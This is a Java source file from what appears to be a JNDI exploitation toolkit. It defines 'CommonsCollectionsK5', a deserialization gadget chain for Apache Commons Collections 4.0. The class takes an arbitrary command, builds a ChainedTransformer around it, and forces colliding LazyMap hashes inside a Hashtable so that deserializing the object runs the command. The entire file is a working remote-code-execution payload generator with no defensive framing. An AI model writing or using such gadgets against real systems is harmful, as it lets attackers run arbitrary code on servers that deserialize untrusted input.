package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.annotation.Dependencies;
import com.nu1r.jndi.gadgets.utils.Reflections;
import com.nu1r.jndi.gadgets.utils.Serializer;
import com.nu1r.jndi.gadgets.utils.cc.TransformerUtil;
import com.nu1r.jndi.gadgets.utils.cc.TransformerUtil4;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.map.LazyMap;

import java.io.ByteArrayOutputStream;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

@Dependencies({"commons-collections:commons-collections:4.0"})
public class CommonsCollectionsK5 implements ObjectPayload<Hashtable>{

    public Hashtable getObject(PayloadType type, String... param) throws Exception {
        String              command          = param[0];
        final Transformer   transformerChain = new ChainedTransformer(new Transformer[]{});
        final Transformer[] transformers     = TransformerUtil4.makeTransformer4(command);
        Map                 innerMap1        = new HashMap();
        Map                 innerMap2        = new HashMap();

        // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
        Map lazyMap1 = LazyMap.lazyMap(innerMap1, transformerChain);
        lazyMap1.put("yy", 1);

        Map lazyMap2 = LazyMap.lazyMap(innerMap2, transformerChain);
        lazyMap2.put("zZ", 1);

        // Use the colliding Maps as keys in Hashtable
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 2);

        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);

        // Needed to ensure hash collision after previous manipulations
        lazyMap2.remove("yy");

        return hashtable;
    }
}
